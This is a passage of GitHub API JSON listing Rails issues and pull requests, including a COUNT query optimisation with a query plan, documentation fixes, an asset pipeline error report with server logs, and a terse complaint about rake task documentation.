\"referrals\".\"company_id\" = $1 LIMIT $2) subquery_for_count  [[\"company_id\",\"29f1dfa2-01d0-4e5d-b482-7aa1f3ba7535\", [\"LIMIT\", 100]]\r\n=> 100\r\n```\r\n\r\nSo it's 300x faster even when doing an index only scan:\r\n\r\n```sql\r\nexplain SELECT COUNT(*) FROM \"referrals\" WHERE \"referrals\".\"company_id\" ='29f1dfa2-01d0-4e5d-b482-7aa1f3ba7535';\r\n\r\n                                                                          QUERY PLAN                                                                           \r\n---------------------------------------------------------------------------------------------------------------------------------------------------------------\r\n Finalize Aggregate  (cost=136744.58..136744.59 rows=1 width=8)\r\n   ->  Gather  (cost=136744.36..136744.57 rows=2 width=8)\r\n         Workers Planned: 2\r\n         ->  Partial Aggregate  (cost=135744.36..135744.37 rows=1 width=8)\r\n               ->  Parallel Index Only Scan using index_referrals_on_company_id_and_conversion_state on referrals  (cost=0.56..127008.31 rows=3494420 width=0)\r\n                     Index Cond: (company_id = '29f1dfa2-01d0-4e5d-b482-7aa1f3ba7535'::uuid)\r\n```\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50823/reactions",
            "total_count": 2,
            "+1": 2,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50823/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50822",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50822/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50822/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50822/events",
        "html_url": "https://github.com/rails/rails/pull/50822",
        "id": 2092091672,
        "node_id": "PR_kwDNIULOZKCe8g",
        "number": 50822,
        "title": "Fix the CreateProducts migration file name in the docs [ci-skip]",
        "user": {
            "login": "kylevoyto",
            "id": 2006271,
            "node_id": "MDQ6VXNlcjIwMDYyNzE=",
            "avatar_url": "https://avatars.githubusercontent.com/u/2006271?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/kylevoyto",
            "html_url": "https://github.com/kylevoyto",
            "followers_url": "https://api.github.com/users/kylevoyto/followers",
            "following_url": "https://api.github.com/users/kylevoyto/following{/other_user}",
            "gists_url": "https://api.github.com/users/kylevoyto/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/kylevoyto/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/kylevoyto/subscriptions",
            "organizations_url": "https://api.github.com/users/kylevoyto/orgs",
            "repos_url": "https://api.github.com/users/kylevoyto/repos",
            "events_url": "https://api.github.com/users/kylevoyto/events{/privacy}",
            "received_events_url": "https://api.github.com/users/kylevoyto/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-20T15:18:43Z",
        "updated_at": "2024-01-21T02:22:28Z",
        "closed_at": "2024-01-20T17:15:59Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50822",
            "html_url": "https://github.com/rails/rails/pull/50822",
            "diff_url": "https://github.com/rails/rails/pull/50822.diff",
            "patch_url": "https://github.com/rails/rails/pull/50822.patch",
            "merged_at": "2024-01-20T17:15:59Z"
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nThis Pull Request has been created because the documentation under Creating New Tables referenced the wrong migrations file.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50822/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50822/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50821",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50821/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50821/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50821/events",
        "html_url": "https://github.com/rails/rails/issues/50821",
        "id": 2091985012,
        "node_id": "I_kwDNIULOfLEodA",
        "number": 50821,
        "title": "Error: \"application.css\" is not present in the asset pipeline. Fresh installation",
        "user": {
            "login": "DogAndCode",
            "id": 78352930,
            "node_id": "MDQ6VXNlcjc4MzUyOTMw",
            "avatar_url": "https://avatars.githubusercontent.com/u/78352930?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/DogAndCode",
            "html_url": "https://github.com/DogAndCode",
            "followers_url": "https://api.github.com/users/DogAndCode/followers",
            "following_url": "https://api.github.com/users/DogAndCode/following{/other_user}",
            "gists_url": "https://api.github.com/users/DogAndCode/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/DogAndCode/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/DogAndCode/subscriptions",
            "organizations_url": "https://api.github.com/users/DogAndCode/orgs",
            "repos_url": "https://api.github.com/users/DogAndCode/repos",
            "events_url": "https://api.github.com/users/DogAndCode/events{/privacy}",
            "received_events_url": "https://api.github.com/users/DogAndCode/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-01-20T09:37:28Z",
        "updated_at": "2024-01-20T10:22:52Z",
        "closed_at": "2024-01-20T10:22:52Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "Ruby 3.3.0\r\nRails 7.1.3\r\n\r\nFresh installation using: `rails new my_app -c tailwind -j esbuild`\r\n\r\nProblem with **application.html.erb** file when use `bin/dev` with this line: `<%= stylesheet_link_tag \"application\", \"data-turbo-track\": \"reload\" %>`\r\n\r\n```\r\n10:33:56 web.1  | started with pid 28667\r\n10:33:56 css.1  | unknown command: yarn build:css --watch\r\n10:33:57 web.1  | DEBUGGER: Debugger can attach via UNIX domain socket (/run/user/1000/rdbg-28667)\r\n10:33:57 web.1  | => Booting Puma\r\n10:33:57 web.1  | => Rails 7.1.3 application starting in development \r\n10:33:57 web.1  | => Run `bin/rails server --help` for more startup options\r\n10:33:58 web.1  | Puma starting in single mode...\r\n10:33:58 web.1  | * Puma version: 6.4.2 (ruby 3.3.0-p0) (\"The Eagle of Durango\")\r\n10:33:58 web.1  | *  Min threads: 5\r\n10:33:58 web.1  | *  Max threads: 5\r\n10:33:58 web.1  | *  Environment: development\r\n10:33:58 web.1  | *          PID: 28667\r\n10:33:58 web.1  | * Listening on http://127.0.0.1:3000\r\n10:33:58 web.1  | * Listening on http://[::1]:3000\r\n10:33:58 web.1  | Use Ctrl-C to stop\r\n10:34:04 web.1  | Started GET \"/products/2\" for ::1 at 2024-01-20 10:34:04 +0100\r\n10:34:04 web.1  |   ActiveRecord::SchemaMigration Load (0.3ms)  SELECT \"schema_migrations\".\"version\" FROM \"schema_migrations\" ORDER BY \"schema_migrations\".\"version\" ASC\r\n10:34:04 web.1  | Processing by ProductsController#show as HTML\r\n10:34:04 web.1  |   Parameters: {\"id\"=>\"2\"}\r\n10:34:04 web.1  |   Product Load (5.0ms)  SELECT \"products\".* FROM \"products\" WHERE \"products\".\"id\" = ? LIMIT ?  [[\"id\", 2], [\"LIMIT\", 1]]\r\n10:34:04 web.1  |    app/controllers/products_controller.rb:7:in `show'\r\n10:34:04 web.1  |   Rendering layout layouts/application.html.erb\r\n10:34:04 web.1  |   Rendering products/show.html.erb within layouts/application\r\n10:34:04 web.1  |   Rendered products/show.html.erb within layouts/application (Duration: 0.5ms | Allocations: 213)\r\n10:34:05 web.1  |   Rendered layout layouts/application.html.erb (Duration: 776.4ms | Allocations: 51370)\r\n10:34:05 web.1  | Completed 500 Internal Server Error in 1031ms (ActiveRecord: 8.4ms | Allocations: 87088)\r\n10:34:05 web.1  | \r\n10:34:05 web.1  | \r\n10:34:05 web.1  |   \r\n10:34:05 web.1  | ActionView::Template::Error (The asset \"application.css\" is not present in the asset pipeline.\r\n10:34:05 web.1  | ):\r\n10:34:05 web.1  |      6:     <%= csrf_meta_tags %>\r\n10:34:05 web.1  |      7:     <%= csp_meta_tag %>\r\n10:34:05 web.1  |      8: \r\n10:34:05 web.1  |      9:     <%= stylesheet_link_tag \"application\", \"data-turbo-track\": \"reload\" %>\r\n10:34:05 web.1  |     10:     <%= javascript_include_tag \"application\", \"data-turbo-track\": \"reload\", defer: true %>\r\n10:34:05 web.1  |     11:   \r\n10:34:05 web.1  |     12:   </head>\r\n10:34:05 web.1  |   \r\n10:34:05 web.1  | app/views/layouts/application.html.erb:9\r\n```\r\n\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50821/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50821/timeline",
        "performed_via_github_app": null,
        "state_reason": "completed"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50820",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50820/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50820/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50820/events",
        "html_url": "https://github.com/rails/rails/pull/50820",
        "id": 2091981384,
        "node_id": "PR_kwDNIULOZJ9GIg",
        "number": 50820,
        "title": "docs: Update validation status based on autosave status",
        "user": {
            "login": "MONSURU-rgb",
            "id": 78952006,
            "node_id": "MDQ6VXNlcjc4OTUyMDA2",
            "avatar_url": "https://avatars.githubusercontent.com/u/78952006?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/MONSURU-rgb",
            "html_url": "https://github.com/MONSURU-rgb",
            "followers_url": "https://api.github.com/users/MONSURU-rgb/followers",
            "following_url": "https://api.github.com/users/MONSURU-rgb/following{/other_user}",
            "gists_url": "https://api.github.com/users/MONSURU-rgb/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/MONSURU-rgb/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/MONSURU-rgb/subscriptions",
            "organizations_url": "https://api.github.com/users/MONSURU-rgb/orgs",
            "repos_url": "https://api.github.com/users/MONSURU-rgb/repos",
            "events_url": "https://api.github.com/users/MONSURU-rgb/events{/privacy}",
            "received_events_url": "https://api.github.com/users/MONSURU-rgb/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-20T09:24:46Z",
        "updated_at": "2024-01-22T07:16:22Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50820",
            "html_url": "https://github.com/rails/rails/pull/50820",
            "diff_url": "https://github.com/rails/rails/pull/50820.diff",
            "patch_url": "https://github.com/rails/rails/pull/50820.patch",
            "merged_at": null
        },
        "body": "This Pull Request has been created to enlighten users that validations are enabled by default when autosave is True for the  `has_one` and `belongs_to`.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50820/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50820/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50819",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50819/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50819/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50819/events",
        "html_url": "https://github.com/rails/rails/pull/50819",
        "id": 2091947543,
        "node_id": "PR_kwDNIULOZJ7ZrA",
        "number": 50819,
        "title": "[ci skip] docs: fix `Entry#entryable_types` to `Entry.entryable_types`",
        "user": {
            "login": "tanaken0515",
            "id": 26683960,
            "node_id": "MDQ6VXNlcjI2NjgzOTYw",
            "avatar_url": "https://avatars.githubusercontent.com/u/26683960?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/tanaken0515",
            "html_url": "https://github.com/tanaken0515",
            "followers_url": "https://api.github.com/users/tanaken0515/followers",
            "following_url": "https://api.github.com/users/tanaken0515/following{/other_user}",
            "gists_url": "https://api.github.com/users/tanaken0515/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/tanaken0515/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/tanaken0515/subscriptions",
            "organizations_url": "https://api.github.com/users/tanaken0515/orgs",
            "repos_url": "https://api.github.com/users/tanaken0515/repos",
            "events_url": "https://api.github.com/users/tanaken0515/events{/privacy}",
            "received_events_url": "https://api.github.com/users/tanaken0515/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-20T07:32:35Z",
        "updated_at": "2024-01-23T09:52:55Z",
        "closed_at": "2024-01-20T09:25:14Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50819",
            "html_url": "https://github.com/rails/rails/pull/50819",
            "diff_url": "https://github.com/rails/rails/pull/50819.diff",
            "patch_url": "https://github.com/rails/rails/pull/50819.patch",
            "merged_at": "2024-01-20T09:25:14Z"
        },
        "body": "### Motivation / Background\r\n\r\n`<role>_types` is class method. so, fix `Entry#entryable_types` to `Entry.entryable_types` in document.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50819/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50819/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50818",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50818/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50818/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50818/events",
        "html_url": "https://github.com/rails/rails/pull/50818",
        "id": 2091802687,
        "node_id": "PR_kwDNIULOZJzp4g",
        "number": 50818,
        "title": "docs: Add examples to #compact and #compact! documentation [ci-skip]",
        "user": {
            "login": "m-nakamura145",
            "id": 11944718,
            "node_id": "MDQ6VXNlcjExOTQ0NzE4",
            "avatar_url": "https://avatars.githubusercontent.com/u/11944718?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/m-nakamura145",
            "html_url": "https://github.com/m-nakamura145",
            "followers_url": "https://api.github.com/users/m-nakamura145/followers",
            "following_url": "https://api.github.com/users/m-nakamura145/following{/other_user}",
            "gists_url": "https://api.github.com/users/m-nakamura145/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/m-nakamura145/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/m-nakamura145/subscriptions",
            "organizations_url": "https://api.github.com/users/m-nakamura145/orgs",
            "repos_url": "https://api.github.com/users/m-nakamura145/repos",
            "events_url": "https://api.github.com/users/m-nakamura145/events{/privacy}",
            "received_events_url": "https://api.github.com/users/m-nakamura145/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
        "created_at": "2024-01-20T01:48:14Z",
        "updated_at": "2024-01-20T17:37:43Z",
        "closed_at": "2024-01-20T17:37:42Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50818",
            "html_url": "https://github.com/rails/rails/pull/50818",
            "diff_url": "https://github.com/rails/rails/pull/50818.diff",
            "patch_url": "https://github.com/rails/rails/pull/50818.patch",
            "merged_at": null
        },
        "body": "### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50818/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50818/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50817",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50817/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50817/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50817/events",
        "html_url": "https://github.com/rails/rails/pull/50817",
        "id": 2091795271,
        "node_id": "PR_kwDNIULOZJzRGg",
        "number": 50817,
        "title": "[Docs] Add section on Queue Priority to `ActiveJob` docs",
        "user": {
            "login": "joshuay03",
            "id": 54629302,
            "node_id": "MDQ6VXNlcjU0NjI5MzAy",
            "avatar_url": "https://avatars.githubusercontent.com/u/54629302?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/joshuay03",
            "html_url": "https://github.com/joshuay03",
            "followers_url": "https://api.github.com/users/joshuay03/followers",
            "following_url": "https://api.github.com/users/joshuay03/following{/other_user}",
            "gists_url": "https://api.github.com/users/joshuay03/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/joshuay03/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/joshuay03/subscriptions",
            "organizations_url": "https://api.github.com/users/joshuay03/orgs",
            "repos_url": "https://api.github.com/users/joshuay03/repos",
            "events_url": "https://api.github.com/users/joshuay03/events{/privacy}",
            "received_events_url": "https://api.github.com/users/joshuay03/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-20T01:34:27Z",
        "updated_at": "2024-01-26T14:10:50Z",
        "closed_at": "2024-01-25T14:32:09Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50817",
            "html_url": "https://github.com/rails/rails/pull/50817",
            "diff_url": "https://github.com/rails/rails/pull/50817.diff",
            "patch_url": "https://github.com/rails/rails/pull/50817.patch",
            "merged_at": "2024-01-25T14:32:09Z"
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nAdds a `Queue Priority` section to `active_job_basics.md`.\r\n\r\n### Detail\r\n\r\n[Active Job Basics](https://edgeguides.rubyonrails.org/active_job_basics.html) contains a [section on queues](https://edgeguides.rubyonrails.org/active_job_basics.html#queues), but doesn't have one on queue priority (using `queue_with_priority` or `set(priority: priority)`).\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\nNone.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50817/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50817/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50816",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50816/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50816/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50816/events",
        "html_url": "https://github.com/rails/rails/issues/50816",
        "id": 2091779653,
        "node_id": "I_kwDNIULOfK4GRQ",
        "number": 50816,
        "title": "Incomplete documentation on Rails guides refering rake",
        "user": {
            "login": "lflores1961",
            "id": 5589298,
            "node_id": "MDQ6VXNlcjU1ODkyOTg=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5589298?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/lflores1961",
            "html_url": "https://github.com/lflores1961",
            "followers_url": "https://api.github.com/users/lflores1961/followers",
            "following_url": "https://api.github.com/users/lflores1961/following{/other_user}",
            "gists_url": "https://api.github.com/users/lflores1961/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/lflores1961/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/lflores1961/subscriptions",
            "organizations_url": "https://api.github.com/users/lflores1961/orgs",
            "repos_url": "https://api.github.com/users/lflores1961/repos",
            "events_url": "https://api.github.com/users/lflores1961/events{/privacy}",
            "received_events_url": "https://api.github.com/users/lflores1961/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-20T01:02:46Z",
        "updated_at": "2024-01-20T09:41:40Z",
        "closed_at": "2024-01-20T09:41:40Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "```\r\ntask :task_name, [:arg_1] => [:pre_1, :pre_2] do |t, args|\r\n  # You can use args from here\r\nend\r\n```\r\nWhich is the argument? what is :pre_1, :pre2? Why are they in separate arrays? Your documentation sucks, I've been trying for years to understand the whole shit",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50816/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50816/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50815",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50815/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50815/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50815/events",
        "html_url": "https://github.com/rails/rails/pull/50815",
        "id": 2091630145,
        "node_id": "PR_kwDNIULOZJpzBQ",
        "number": 50815,
        "title": "Add format constraints for generated pwa routes",
        "user": {
            "login": "rossta",
            "id": 11673,
            "node_id": "MDQ6VXNlcjExNjcz",
            "avatar_url": "https://avatars.githubusercontent.com/u/11673?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/rossta",
            "html_url": "https://github.com/rossta",
            "followers_url": "https://api.github.com/users/rossta/followers",
            "following_url": "https://api.github.com/users/rossta/following{/other_user}",
            "gists_url": "https://api.github.com/users/rossta/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/rossta/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/rossta/subscriptions",
            "organizations_url": "https://api.github.com/users/rossta/orgs",
            "repos_url": "https://api.github.com/users/rossta/repos",
            "events_url": "https://api.github.com/users/rossta/events{/privacy}",
            "received_events_url": "https://api.github.com/users/rossta/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-01-19T23:10:41Z",
        "updated_at": "2024-01-22T12:00:23Z",
        "closed_at": null,
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50815",
            "html_url": "https://github.com/rails/rails/pull/50815",
            "diff_url": "https://github.com/rails/rails/pull/50815.diff",
